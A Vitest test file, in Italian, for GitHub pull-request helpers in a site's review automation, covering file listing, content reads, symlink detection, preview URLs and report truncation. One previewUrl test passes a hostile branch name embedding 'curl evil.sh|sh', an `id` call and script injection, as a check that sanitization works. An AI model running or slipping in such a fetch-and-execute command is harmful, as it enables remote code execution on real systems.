import { describe, expect, it } from 'vitest';
import {
  CONTROLLI_OBBLIGATORI,
  ETICHETTA_LIVELLO_1,
  LIMITE_CORPO,
  PropostaCambiata,
  VerificaNonPossibile,
  fetchPullRequest,
  fetchPullRequestInput,
  limitaCorpo,
  previewUrl,
  sincronizzaEtichetta,
  upsertReport,
} from '../../scripts/autonomia/github';
import { MARCATORE } from '../../scripts/autonomia/report';
import { ETICHETTA_INVIATA, HOME, NEGOZIO, negozioJson, rules } from './fixtures';
import {
  BASE_SHA,
  HEAD_SHA,
  chiave,
  creaOctokitFinto,
  erroreHttp,
  quante,
  shaDiFile,
  type ScenarioFinto,
} from './octokitFinto';

const ref = { owner: 'eusebjo', repo: 'alma-living', pullNumber: 7 };
const FOTO = 'src/content/pagine/immagini/foto.webp';
const GERGO = /branch|merge|commit/i;

/** Proposta della redazione (`lei`) già inviata per la revisione. */
const dellaRedazione = (scenario: ScenarioFinto): ScenarioFinto => ({
  autore: 'lei',
  etichette: [ETICHETTA_INVIATA],
  ...scenario,
});

describe('fetchPullRequestInput', () => {
  it('mappa pulls.get e pulls.listFiles su PullRequestInput', async () => {
    const prima = negozioJson();
    const dopo = negozioJson((n) => {
      n.descrizione = 'Nuova descrizione.';
    });
    const { octokit, chiamate } = creaOctokitFinto(
      dellaRedazione({
        etichette: [ETICHETTA_INVIATA, 'altra'],
        files: [{ filename: NEGOZIO, status: 'modified' }],
        contenuti: {
          [chiave(BASE_SHA, NEGOZIO)]: { testo: prima },
          [chiave(HEAD_SHA, NEGOZIO)]: { testo: dopo },
        },
      }),
    );

    const input = await fetchPullRequestInput(octokit, ref, rules);

    expect(input).toEqual({
      author: 'lei',
      draft: false,
      labels: [ETICHETTA_INVIATA, 'altra'],
      files: [
        {
          path: NEGOZIO,
          status: 'modified',
          before: prima,
          after: dopo,
          sizeBytes: Buffer.byteLength(dopo),
        },
      ],
    });
    expect(chiamate.find((c) => c.metodo === 'pulls.get')?.params).toEqual({
      owner: 'eusebjo',
      repo: 'alma-living',
      pull_number: 7,
    });
  });

  it('legge `before` dal ramo di base e `after` dalla testata', async () => {
    const { octokit, chiamate } = creaOctokitFinto(
      dellaRedazione({
        files: [{ filename: HOME, status: 'modified' }],
        contenuti: {
          [chiave(BASE_SHA, HOME)]: { testo: 'prima' },
          [chiave(HEAD_SHA, HOME)]: { testo: 'dopo' },
        },
      }),
    );

    await fetchPullRequestInput(octokit, ref, rules);

    const letture = chiamate
      .filter((c) => c.metodo === 'repos.getContent')
      .map((c) => c.params);
    expect(letture).toEqual(
      expect.arrayContaining([
        { owner: 'eusebjo', repo: 'alma-living', path: HOME, ref: BASE_SHA, mediaType: { format: 'object' } },
        { owner: 'eusebjo', repo: 'alma-living', path: HOME, ref: HEAD_SHA, mediaType: { format: 'object' } },
      ]),
    );
    expect(letture).toHaveLength(2);
  });

  it('un file aggiunto ha before null; uno rimosso ha after null', async () => {
    const { octokit, chiamate } = creaOctokitFinto(
      dellaRedazione({
        files: [
          { filename: 'src/content/pagine/nuova.md', status: 'added' },
          { filename: HOME, status: 'removed' },
        ],
        contenuti: {
          [chiave(HEAD_SHA, 'src/content/pagine/nuova.md')]: { testo: 'nuova' },
          [chiave(BASE_SHA, HOME)]: { testo: 'vecchia' },
        },
      }),
    );

    const { files } = await fetchPullRequestInput(octokit, ref, rules);

    expect(files[0]).toMatchObject({ status: 'added', before: null, after: 'nuova' });
    expect(files[1]).toMatchObject({ status: 'removed', before: 'vecchia', after: null });
    // Nessuna lettura inutile: niente base per l'aggiunto, niente testata per il rimosso.
    const refLetti = chiamate
      .filter((c) => c.metodo === 'repos.getContent')
      .map((c) => `${String(c.params.ref).slice(0, 1)}:${String(c.params.path)}`);
    expect(refLetti.sort()).toEqual(
      [`a:src/content/pagine/nuova.md`, `b:${HOME}`].sort(),
    );
  });

  it('previousPath viene da previous_filename e before dal vecchio percorso', async () => {
    const nuovo = 'src/content/pagine/chi-siamo.md';
    const { octokit } = creaOctokitFinto(
      dellaRedazione({
        files: [{ filename: nuovo, status: 'renamed', previous_filename: HOME }],
        contenuti: {
          [chiave(BASE_SHA, HOME)]: { testo: 'testo' },
          [chiave(HEAD_SHA, nuovo)]: { testo: 'testo' },
        },
      }),
    );

    const { files } = await fetchPullRequestInput(octokit, ref, rules);

    expect(files).toEqual([
      {
        path: nuovo,
        status: 'renamed',
        previousPath: HOME,
        before: 'testo',
        after: 'testo',
        sizeBytes: 5,
      },
    ]);
  });

  it('pagina pulls.listFiles finché ci sono file', async () => {
    const molti = Array.from({ length: 250 }, (_, i) => ({
      filename: `docs/file-${i}.md`,
      status: 'modified',
    }));
    const { octokit, chiamate } = creaOctokitFinto({
      autore: 'eusebjo',
      files: molti,
    });

    const { files } = await fetchPullRequestInput(octokit, ref, rules);

    expect(files).toHaveLength(250);
    expect(files[249]?.path).toBe('docs/file-249.md');
    const pagine = chiamate
      .filter((c) => c.metodo === 'pulls.listFiles')
      .map((c) => [c.params.page, c.params.per_page]);
    expect(pagine).toEqual([
      [1, 100],
      [2, 100],
      [3, 100],
    ]);
  });

  describe('file media', () => {
    it('imposta sizeBytes dalla risposta di getContent senza leggere il contenuto', async () => {
      const { octokit, chiamate, stato } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: FOTO, status: 'added' }],
          contenuti: { [chiave(HEAD_SHA, FOTO)]: { testo: 'x', size: 123_456 } },
        }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files).toEqual([
        { path: FOTO, status: 'added', before: null, after: null, sizeBytes: 123_456 },
      ]);
      expect(stato.letturaContenuto).toBe(0);
      expect(quante(chiamate, 'repos.getContent')).toBe(1);
    });

    it('per un media modificato non legge nemmeno la versione di base', async () => {
      const { octokit, chiamate, stato } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: FOTO, status: 'modified' }],
          contenuti: {
            [chiave(BASE_SHA, FOTO)]: { size: 10 },
            [chiave(HEAD_SHA, FOTO)]: { size: 2_500_000 },
          },
        }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files[0]).toMatchObject({ before: null, after: null, sizeBytes: 2_500_000 });
      expect(chiamate.filter((c) => c.metodo === 'repos.getContent')).toHaveLength(1);
      expect(stato.letturaContenuto).toBe(0);
    });

    it('misura anche un media tra 1 e 1,5 MB (formato object, solo metadati)', async () => {
      const { octokit, stato } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: FOTO, status: 'added' }],
          contenuti: { [chiave(HEAD_SHA, FOTO)]: { size: 1_200_000 } },
        }),
      );

      const { input, bloccati } = await fetchPullRequest(octokit, ref, rules);

      expect(input.files[0]).toMatchObject({ sizeBytes: 1_200_000, after: null });
      expect(bloccati).toEqual([]);
      expect(stato.letturaContenuto).toBe(0);
    });

    it('chiede sempre a getContent il formato object', async () => {
      const { octokit, chiamate } = creaOctokitFinto(
        dellaRedazione({
          files: [
            { filename: HOME, status: 'modified' },
            { filename: FOTO, status: 'added' },
          ],
          contenuti: {
            [chiave(BASE_SHA, HOME)]: { testo: 'prima' },
            [chiave(HEAD_SHA, HOME)]: { testo: 'dopo' },
            [chiave(HEAD_SHA, FOTO)]: { size: 10 },
          },
        }),
      );

      await fetchPullRequestInput(octokit, ref, rules);

      const letture = chiamate.filter((c) => c.metodo === 'repos.getContent');
      expect(letture).toHaveLength(3);
      for (const lettura of letture) {
        expect(lettura.params.mediaType).toEqual({ format: 'object' });
      }
    });

    it('un media rimosso non richiede nessuna lettura', async () => {
      const { octokit, chiamate } = creaOctokitFinto(
        dellaRedazione({ files: [{ filename: FOTO, status: 'removed' }] }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files[0]).toMatchObject({ status: 'removed', before: null, after: null });
      expect(quante(chiamate, 'repos.getContent')).toBe(0);
    });

    it('se la dimensione manca lascia sizeBytes indefinito (evaluate respinge)', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: FOTO, status: 'added' }],
          // Nessun contenuto: la testata risponde 404.
        }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files[0]?.sizeBytes).toBeUndefined();
    });
  });

  describe('file che non sono file normali', () => {
    it.each(['symlink', 'submodule', 'directory'] as const)(
      'un %s alla testata è segnalato e il suo contenuto non viene usato',
      async (tipo) => {
        const { octokit } = creaOctokitFinto(
          dellaRedazione({
            files: [
              { filename: HOME, status: 'modified' },
              { filename: FOTO, status: 'added' },
            ],
            contenuti: {
              [chiave(BASE_SHA, HOME)]: { testo: 'prima' },
              [chiave(HEAD_SHA, HOME)]: { tipo, testo: 'dopo' },
              [chiave(HEAD_SHA, FOTO)]: { tipo, size: 20 },
            },
          }),
        );

        const { input, bloccati } = await fetchPullRequest(octokit, ref, rules);

        expect(input.files[0]).toMatchObject({ before: 'prima', after: null });
        expect(input.files[0]?.sizeBytes).toBeUndefined();
        expect(input.files[1]?.sizeBytes).toBeUndefined();
        expect(bloccati.map((b) => b.file)).toEqual([HOME, FOTO]);
        for (const blocco of bloccati) {
          expect(blocco.azione).toBe('perimetro');
          expect(blocco.messaggio).toMatch(/collegamento|non è un file/i);
          expect(blocco.messaggio).not.toMatch(GERGO);
        }
      },
    );

    // L'API di GitHub, davanti a un collegamento simbolico verso un file DEL
    // REPOSITORY, risponde con `type: "file"` e il contenuto della destinazione:
    // l'unica traccia è lo SHA del blob, diverso da quello di `listFiles`.
    it.each([
      ['un file di contenuto', HOME, 'modified'],
      ['un file dei media', FOTO, 'added'],
    ] as const)(
      'un collegamento verso un file del repository (%s) è segnalato dallo SHA diverso',
      async (_nome, percorso, status) => {
        const bersaglio = 'f'.repeat(40);
        const { octokit } = creaOctokitFinto(
          dellaRedazione({
            files: [{ filename: percorso, status }],
            contenuti: {
              [chiave(BASE_SHA, percorso)]: { testo: 'prima' },
              [chiave(HEAD_SHA, percorso)]: {
                tipo: 'file',
                testo: 'contenuto della destinazione',
                size: 28,
                sha: bersaglio,
              },
            },
          }),
        );

        const { input, bloccati } = await fetchPullRequest(octokit, ref, rules);

        expect(bloccati.map((b) => b.file)).toEqual([percorso]);
        expect(bloccati[0]?.azione).toBe('perimetro');
        expect(bloccati[0]?.messaggio).not.toMatch(GERGO);
        // Il contenuto della destinazione non viene usato come se fosse il file.
        expect(input.files[0]?.after).toBeNull();
        expect(input.files[0]?.sizeBytes).toBeUndefined();
      },
    );

    it('se pulls.listFiles non dà lo SHA del file, non si può escludere un collegamento', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: HOME, status: 'added', sha: null }],
          contenuti: { [chiave(HEAD_SHA, HOME)]: { testo: 'x' } },
        }),
      );

      const { input, bloccati } = await fetchPullRequest(octokit, ref, rules);

      expect(bloccati.map((b) => b.file)).toEqual([HOME]);
      expect(input.files[0]?.after).toBeNull();
    });

    it('gli SHA si confrontano senza distinguere maiuscole e minuscole', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: HOME, status: 'added', sha: shaDiFile(HOME).toUpperCase() }],
          contenuti: { [chiave(HEAD_SHA, HOME)]: { testo: 'x' } },
        }),
      );

      const { input, bloccati } = await fetchPullRequest(octokit, ref, rules);

      expect(bloccati).toEqual([]);
      expect(input.files[0]?.after).toBe('x');
    });

    it('un file normale non genera segnalazioni', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: HOME, status: 'modified' }],
          contenuti: {
            [chiave(BASE_SHA, HOME)]: { testo: 'prima' },
            [chiave(HEAD_SHA, HOME)]: { testo: 'dopo' },
          },
        }),
      );

      expect((await fetchPullRequest(octokit, ref, rules)).bloccati).toEqual([]);
    });
  });

  describe('elenco dei file completo', () => {
    it('fallisce se GitHub dichiara più file di quelli elencati', async () => {
      const { octokit } = creaOctokitFinto({
        autore: 'eusebjo',
        files: [{ filename: 'README.md', status: 'modified' }],
        fileDichiarati: 5,
      });

      const promessa = fetchPullRequestInput(octokit, ref, rules);

      await expect(promessa).rejects.toBeInstanceOf(VerificaNonPossibile);
      await expect(promessa).rejects.toThrow(/tutti i file/i);
      await expect(promessa).rejects.not.toThrow(GERGO);
    });

    it('si ferma a 3.000 file (limite di GitHub) e poi fallisce', async () => {
      const troppi = Array.from({ length: 3000 }, (_, i) => ({
        filename: `docs/${i}.md`,
        status: 'added',
      }));
      const { octokit, chiamate } = creaOctokitFinto({
        autore: 'eusebjo',
        files: troppi,
        fileDichiarati: 3500,
      });

      await expect(fetchPullRequestInput(octokit, ref, rules)).rejects.toBeInstanceOf(
        VerificaNonPossibile,
      );
      expect(quante(chiamate, 'pulls.listFiles')).toBe(30);
    });

    it('fallisce se GitHub non dichiara quanti file ci sono', async () => {
      const { octokit } = creaOctokitFinto({
        autore: 'eusebjo',
        files: [{ filename: 'README.md', status: 'modified' }],
        fileDichiarati: null,
      });

      await expect(fetchPullRequestInput(octokit, ref, rules)).rejects.toBeInstanceOf(
        VerificaNonPossibile,
      );
    });

    it("fallisce se l'elenco dei file non si riesce a leggere", async () => {
      const { octokit } = creaOctokitFinto({
        autore: 'eusebjo',
        errori: { 'pulls.listFiles': erroreHttp(502) },
      });

      await expect(fetchPullRequestInput(octokit, ref, rules)).rejects.toMatchObject({
        status: 502,
      });
    });

    it('una proposta senza file è un elenco valido (la decisione spetta a chi valuta)', async () => {
      const { octokit } = creaOctokitFinto({ autore: 'eusebjo', files: [] });

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files).toEqual([]);
    });
  });

  describe('lettura dei contenuti', () => {
    it('se un contenuto non esiste (404) lo segna come illeggibile e non fallisce', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: HOME, status: 'modified' }],
          contenuti: { [chiave(BASE_SHA, HOME)]: { testo: 'prima' } },
        }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files[0]).toMatchObject({ before: 'prima', after: null });
    });

    it('un errore diverso da 404 interrompe il controllo', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: HOME, status: 'modified' }],
          contenuti: {
            [chiave(BASE_SHA, HOME)]: { testo: 'prima' },
            [chiave(HEAD_SHA, HOME)]: erroreHttp(403, 'rate limit'),
          },
        }),
      );

      await expect(fetchPullRequestInput(octokit, ref, rules)).rejects.toMatchObject({
        status: 403,
      });
    });

    it('un file troppo grande per l’API (contenuto non incluso) vale come illeggibile', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: HOME, status: 'modified' }],
          contenuti: {
            [chiave(BASE_SHA, HOME)]: { testo: 'prima' },
            [chiave(HEAD_SHA, HOME)]: { troppoGrande: true, size: 3_000_000 },
          },
        }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files[0]?.after).toBeNull();
    });

    it("l'autore si confronta senza distinguere maiuscole e minuscole", async () => {
      const { octokit, chiamate } = creaOctokitFinto(
        dellaRedazione({
          autore: 'LEI',
          files: [{ filename: HOME, status: 'added' }],
          contenuti: { [chiave(HEAD_SHA, HOME)]: { testo: 'x' } },
        }),
      );

      await fetchPullRequestInput(octokit, ref, rules);

      expect(quante(chiamate, 'repos.getContent')).toBe(1);
    });

    it.each([
      ['sviluppo', { autore: 'eusebjo', etichette: [] }],
      ['bozza', { bozza: true }],
      ['proposta non inviata', { etichette: [] }],
    ])(
      'non legge i contenuti quando evaluate non li usa (%s)',
      async (_nome, scenario) => {
        const { octokit, chiamate } = creaOctokitFinto(
          dellaRedazione({
            ...scenario,
            files: [
              { filename: HOME, status: 'modified' },
              { filename: FOTO, status: 'added' },
            ],
          }),
        );

        const { files } = await fetchPullRequestInput(octokit, ref, rules);

        expect(quante(chiamate, 'repos.getContent')).toBe(0);
        expect(files.map((f) => f.path)).toEqual([HOME, FOTO]);
      },
    );

    it('passa invariati gli stati che evaluate non conosce (copied, changed)', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({ files: [{ filename: HOME, status: 'copied' }] }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files[0]?.status).toBe('copied');
    });
  });

  describe('ramo della proposta', () => {
    it('è il ramo di testata se sta nello stesso repository', async () => {
      const { octokit } = creaOctokitFinto({ autore: 'eusebjo', ramo: 'fase1/2-anteprime' });

      expect((await fetchPullRequest(octokit, ref, rules)).ramo).toBe('fase1/2-anteprime');
    });

    it.each([
      ['un fork', { repoTestata: 'altro/alma-living' }],
      ['un repository cancellato', { repoTestata: null }],
    ])('è null se la proposta arriva da %s', async (_nome, scenario) => {
      const { octokit } = creaOctokitFinto({ autore: 'eusebjo', ...scenario });

      expect((await fetchPullRequest(octokit, ref, rules)).ramo).toBeNull();
    });
  });

  describe('ramo del pannello (cms/) aperto da chi è nello sviluppo', () => {
    // Il ramo `cms/` si valuta con le regole della redazione (vedi evaluate):
    // quindi per leggere i contenuti conta il ramo, non chi apre la proposta.
    const scenarioSviluppo = (ramo: string): ScenarioFinto => ({
      autore: 'eusebjo',
      etichette: [ETICHETTA_INVIATA],
      ramo,
      files: [{ filename: HOME, status: 'modified' }],
      contenuti: {
        [chiave(BASE_SHA, HOME)]: { testo: 'prima' },
        [chiave(HEAD_SHA, HOME)]: { testo: 'dopo' },
      },
    });

    it('legge before e after come per la redazione', async () => {
      const { octokit, chiamate } = creaOctokitFinto(scenarioSviluppo('cms/pagine/home'));

      const caricata = await fetchPullRequest(octokit, ref, rules);

      expect(caricata.ramo).toBe('cms/pagine/home');
      expect(caricata.input.files).toEqual([
        { path: HOME, status: 'modified', before: 'prima', after: 'dopo', sizeBytes: 4 },
      ]);
      expect(quante(chiamate, 'repos.getContent')).toBe(2);
    });

    it.each(['fase1/9-correzioni', 'main-fix', 'cmsx/pagine/home'])(
      'su un ramo di sviluppo (%s) non legge i contenuti',
      async (ramo) => {
        const { octokit, chiamate } = creaOctokitFinto(scenarioSviluppo(ramo));

        const { input } = await fetchPullRequest(octokit, ref, rules);

        expect(quante(chiamate, 'repos.getContent')).toBe(0);
        expect(input.files[0]).toMatchObject({ before: null, after: null });
      },
    );

    it('in bozza o senza etichetta di invio non legge i contenuti, come per la redazione', async () => {
      for (const extra of [{ bozza: true }, { etichette: [] }]) {
        const { octokit, chiamate } = creaOctokitFinto({
          ...scenarioSviluppo('cms/pagine/home'),
          ...extra,
        });

        await fetchPullRequest(octokit, ref, rules);

        expect(quante(chiamate, 'repos.getContent')).toBe(0);
      }
    });

    it('un fork resta respinto senza leggere nulla, anche con un ramo cms/', async () => {
      const { octokit, chiamate } = creaOctokitFinto({
        ...scenarioSviluppo('cms/pagine/home'),
        repoTestata: 'altro/alma-living',
      });

      const caricata = await fetchPullRequest(octokit, ref, rules);

      expect(caricata.ramo).toBeNull();
      expect(quante(chiamate, 'pulls.listFiles')).toBe(0);
      expect(quante(chiamate, 'repos.getContent')).toBe(0);
    });
  });

  describe('versione di partenza della proposta (before)', () => {
    // Mentre la proposta è aperta `main` può cambiare. `pulls.listFiles` elenca
    // le differenze rispetto a dove la proposta si è staccata da `main`: anche
    // `before` va letto lì, non alla punta attuale di `main`, altrimenti una
    // modifica fatta su `main` nel frattempo verrebbe attribuita alla redazione.
    const MERGE_BASE = 'd'.repeat(40);
    const scenarioMain = (extra: ScenarioFinto = {}): ScenarioFinto =>
      dellaRedazione({
        mergeBaseSha: MERGE_BASE,
        files: [{ filename: HOME, status: 'modified' }],
        contenuti: {
          [chiave(MERGE_BASE, HOME)]: { testo: 'dal punto di partenza' },
          [chiave(BASE_SHA, HOME)]: { testo: 'punta di main, cambiata nel frattempo' },
          [chiave(HEAD_SHA, HOME)]: { testo: 'dopo' },
        },
        ...extra,
      });

    it('legge before dal punto da cui la proposta parte, non dalla punta di main', async () => {
      const { octokit, chiamate } = creaOctokitFinto(scenarioMain());

      const { input } = await fetchPullRequest(octokit, ref, rules);

      expect(input.files[0]).toMatchObject({ before: 'dal punto di partenza', after: 'dopo' });
      const letti = chiamate
        .filter((c) => c.metodo === 'repos.getContent')
        .map((c) => c.params.ref);
      expect(letti.sort()).toEqual([HEAD_SHA, MERGE_BASE].sort());
    });

    it('chiede il punto di partenza confrontando la base e la testata della proposta', async () => {
      const { octokit, chiamate } = creaOctokitFinto(scenarioMain());

      await fetchPullRequest(octokit, ref, rules);

      const confronti = chiamate.filter((c) => c.metodo === 'repos.compareCommitsWithBasehead');
      expect(confronti.map((c) => c.params)).toEqual([
        {
          owner: 'eusebjo',
          repo: 'alma-living',
          basehead: `${BASE_SHA}...${HEAD_SHA}`,
          per_page: 1,
        },
      ]);
    });

    it('lo chiede una sola volta con più file, anche se si leggono in parallelo', async () => {
      const piu = Array.from({ length: 5 }, (_, i) => `src/content/pagine/p${i}.md`);
      const { octokit, chiamate } = creaOctokitFinto(
        scenarioMain({
          files: piu.map((filename) => ({ filename, status: 'modified' })),
          contenuti: Object.fromEntries(
            piu.flatMap((p) => [
              [chiave(MERGE_BASE, p), { testo: 'a' }],
              [chiave(HEAD_SHA, p), { testo: 'b' }],
            ]),
          ),
        }),
      );

      const { input } = await fetchPullRequest(octokit, ref, rules);

      expect(quante(chiamate, 'repos.compareCommitsWithBasehead')).toBe(1);
      expect(input.files.every((f) => f.before === 'a' && f.after === 'b')).toBe(true);
    });

    it('un file rinominato legge before dal vecchio percorso, sempre dal punto di partenza', async () => {
      const nuovo = 'src/content/pagine/chi-siamo.md';
      const { octokit } = creaOctokitFinto(
        scenarioMain({
          files: [{ filename: nuovo, status: 'renamed', previous_filename: HOME }],
          contenuti: {
            [chiave(MERGE_BASE, HOME)]: { testo: 'vecchio' },
            [chiave(HEAD_SHA, nuovo)]: { testo: 'nuovo' },
          },
        }),
      );

      const { input } = await fetchPullRequest(octokit, ref, rules);

      expect(input.files[0]).toMatchObject({ before: 'vecchio', after: 'nuovo' });
    });

    it.each([
      ['sviluppo', { autore: 'eusebjo', ramo: 'fase1/x' }],
      ['bozza', { bozza: true }],
      ['proposta non inviata', { etichette: [] }],
      ['autore sconosciuto', { autore: 'estraneo' }],
      ['fork', { repoTestata: 'altro/alma-living' }],
    ] as Array<[string, ScenarioFinto]>)(
      'non lo chiede quando non si leggono i contenuti (%s)',
      async (_nome, extra) => {
        const { octokit, chiamate } = creaOctokitFinto(scenarioMain(extra));

        await fetchPullRequest(octokit, ref, rules);

        expect(quante(chiamate, 'repos.compareCommitsWithBasehead')).toBe(0);
      },
    );

    it('lo chiede anche per un file rimosso: serve sapere cosa si toglie', async () => {
      const { octokit, chiamate } = creaOctokitFinto(
        scenarioMain({
          files: [{ filename: HOME, status: 'removed' }],
          contenuti: { [chiave(MERGE_BASE, HOME)]: { testo: 'vecchia' } },
        }),
      );

      const { input } = await fetchPullRequest(octokit, ref, rules);

      expect(quante(chiamate, 'repos.compareCommitsWithBasehead')).toBe(1);
      expect(input.files[0]).toMatchObject({ before: 'vecchia', after: null });
    });

    it('con soli file aggiunti o media non fa nemmeno il confronto', async () => {
      const { octokit, chiamate } = creaOctokitFinto(
        scenarioMain({
          files: [
            { filename: 'src/content/pagine/nuova.md', status: 'added' },
            { filename: FOTO, status: 'modified' },
          ],
          contenuti: {
            [chiave(HEAD_SHA, 'src/content/pagine/nuova.md')]: { testo: 'x' },
            [chiave(HEAD_SHA, FOTO)]: { testo: 'x', size: 10 },
          },
        }),
      );

      await fetchPullRequest(octokit, ref, rules);

      expect(quante(chiamate, 'repos.compareCommitsWithBasehead')).toBe(0);
    });

    it('se il punto di partenza non si può stabilire la verifica fallisce, in italiano', async () => {
      const { octokit } = creaOctokitFinto(scenarioMain({ mergeBaseSha: null }));

      const promessa = fetchPullRequest(octokit, ref, rules);

      await expect(promessa).rejects.toBeInstanceOf(VerificaNonPossibile);
      await expect(promessa).rejects.toThrow(/versione/i);
      await expect(promessa).rejects.not.toThrow(GERGO);
    });

    it.each([
      ['uno SHA vuoto', ''],
      ['uno SHA che non è un testo', 12345],
    ])('%s non vale come punto di partenza', async (_nome, sha) => {
      const { octokit } = creaOctokitFinto(
        scenarioMain({ mergeBaseSha: sha as unknown as string }),
      );

      await expect(fetchPullRequest(octokit, ref, rules)).rejects.toBeInstanceOf(
        VerificaNonPossibile,
      );
    });

    it("se il confronto dà errore l'errore si propaga (la verifica non passa)", async () => {
      const { octokit } = creaOctokitFinto(
        scenarioMain({ errori: { 'repos.compareCommitsWithBasehead': erroreHttp(502) } }),
      );

      await expect(fetchPullRequest(octokit, ref, rules)).rejects.toMatchObject({ status: 502 });
    });
  });

  describe('proposte che si respingono comunque: nessuna lettura dei file', () => {
    const file = [
      { filename: HOME, status: 'modified' },
      { filename: FOTO, status: 'added' },
    ];

    it('un autore sconosciuto non fa leggere né l’elenco né i contenuti', async () => {
      const { octokit, chiamate } = creaOctokitFinto({
        autore: 'estraneo',
        files: file,
        // Anche con un elenco dichiarato impossibile da leggere per intero.
        fileDichiarati: 5000,
      });

      const caricata = await fetchPullRequest(octokit, ref, rules);

      expect(quante(chiamate, 'pulls.listFiles')).toBe(0);
      expect(quante(chiamate, 'repos.getContent')).toBe(0);
      expect(caricata.input).toEqual({
        author: 'estraneo',
        draft: false,
        labels: [],
        files: [],
      });
      expect(caricata.bloccati).toEqual([]);
    });

    it.each([
      ['redazione', 'lei'],
      ['sviluppo', 'eusebjo'],
    ])('un fork non fa leggere nulla nemmeno a un autore di %s', async (_ruolo, autore) => {
      const { octokit, chiamate } = creaOctokitFinto(
        dellaRedazione({
          autore,
          repoTestata: 'altro/alma-living',
          files: file,
        }),
      );

      const caricata = await fetchPullRequest(octokit, ref, rules);

      expect(quante(chiamate, 'pulls.listFiles')).toBe(0);
      expect(quante(chiamate, 'repos.getContent')).toBe(0);
      expect(caricata.ramo).toBeNull();
      expect(caricata.input.files).toEqual([]);
    });
  });

  describe('proposta cambiata durante la verifica', () => {
    const scenario = { autore: 'eusebjo', files: [{ filename: 'README.md', status: 'modified' }] };

    it('si ferma subito se lo SHA dell’evento non è quello attuale', async () => {
      const { octokit, chiamate } = creaOctokitFinto(scenario);

      const promessa = fetchPullRequest(octokit, ref, rules, {
        headShaAtteso: 'c'.repeat(40),
      });

      await expect(promessa).rejects.toBeInstanceOf(PropostaCambiata);
      await expect(promessa).rejects.toBeInstanceOf(VerificaNonPossibile);
      await expect(promessa).rejects.toThrow(/cambiata durante la verifica/);
      await expect(promessa).rejects.not.toThrow(GERGO);
      expect(quante(chiamate, 'pulls.listFiles')).toBe(0);
    });

    it('prosegue se coincide (senza distinguere maiuscole e minuscole)', async () => {
      const { octokit } = creaOctokitFinto(scenario);

      const caricata = await fetchPullRequest(octokit, ref, rules, {
        headShaAtteso: HEAD_SHA.toUpperCase(),
      });

      expect(caricata.input.files).toHaveLength(1);
    });

    it('senza SHA atteso non controlla nulla', async () => {
      const { octokit } = creaOctokitFinto(scenario);

      await expect(fetchPullRequest(octokit, ref, rules)).resolves.toBeDefined();
    });
  });
});

describe('previewUrl', () => {
  it.each([
    ['fase1/2-anteprime', 'https://fase1-2-anteprime-alma-living.sebjomuho.workers.dev/'],
    ['cms/pagine/home', 'https://cms-pagine-home-alma-living.sebjomuho.workers.dev/'],
    ['Fase1/Titolo_Maiuscolo.v2', 'https://fase1-titolo-maiuscolo-v2-alma-living.sebjomuho.workers.dev/'],
    ['a///b__c..d', 'https://a-b-c-d-alma-living.sebjomuho.workers.dev/'],
    ['--bordi--', 'https://bordi-alma-living.sebjomuho.workers.dev/'],
    ['/inizio/e/fine/', 'https://inizio-e-fine-alma-living.sebjomuho.workers.dev/'],
    ['perché/città', 'https://perch-citt-alma-living.sebjomuho.workers.dev/'],
  ])('%s -> %s', (ramo, atteso) => {
    expect(previewUrl(ramo)).toBe(atteso);
  });

  it('neutralizza i caratteri pericolosi di un nome di ramo ostile', () => {
    const url = previewUrl('x$(curl evil.sh|sh);`id`&&"><script>/../..');
    expect(url).toMatch(/^https:\/\/[a-z0-9-]+-alma-living\.sebjomuho\.workers\.dev\/$/);
    expect(url).not.toMatch(/[$();`&"<>|\s]/);
  });

  it("restituisce una stringa vuota se del nome non resta nulla", () => {
    expect(previewUrl('///')).toBe('');
    expect(previewUrl('')).toBe('');
    expect(previewUrl('èèè')).toBe('');
  });
});

describe('limitaCorpo', () => {
  it('lascia invariato un testo entro il limite', () => {
    const testo = `${MARCATORE}\n\nTutto bene.\n`;
    expect(limitaCorpo(testo)).toBe(testo);
  });

  it('accorcia un testo troppo lungo tenendo il marcatore all’inizio e una nota in italiano', () => {
    const righe = Array.from({ length: 5000 }, (_, i) => `- voce ${i}: ${'x'.repeat(40)}`);
    const testo = `${MARCATORE}\n\n## Titolo\n\n${righe.join('\n')}\n`;

    const corto = limitaCorpo(testo);

    expect(corto.length).toBeLessThanOrEqual(LIMITE_CORPO);
    expect(corto.startsWith(`${MARCATORE}\n`)).toBe(true);
    expect(corto).toMatch(/elenco è stato accorciato/i);
    expect(corto).not.toMatch(GERGO);
    // Il taglio avviene a fine riga: ogni voce rimasta è intera.
    const rimaste = corto.split('\n').filter((r) => r.startsWith('- voce '));
    expect(rimaste.length).toBeGreaterThan(100);
    for (const riga of rimaste) expect(riga).toMatch(/^- voce \d+: x{40}$/);
  });

  it('rispetta un limite più stretto e resta sotto i 65.536 caratteri di GitHub', () => {
    const testo = `${MARCATORE}\n${'a'.repeat(200_000)}`;

    expect(limitaCorpo(testo, 1000).length).toBeLessThanOrEqual(1000);
    expect(limitaCorpo(testo).length).toBeLessThan(65_536);
    expect(LIMITE_CORPO).toBeLessThan(65_536);
  });

  it('non spezza una coppia di surrogati se non ci sono righe', () => {
    const testo = `${MARCATORE}\n${'😀'.repeat(50_000)}`;

    const corto = limitaCorpo(testo, 2001);

    expect(corto.length).toBeLessThanOrEqual(2001);
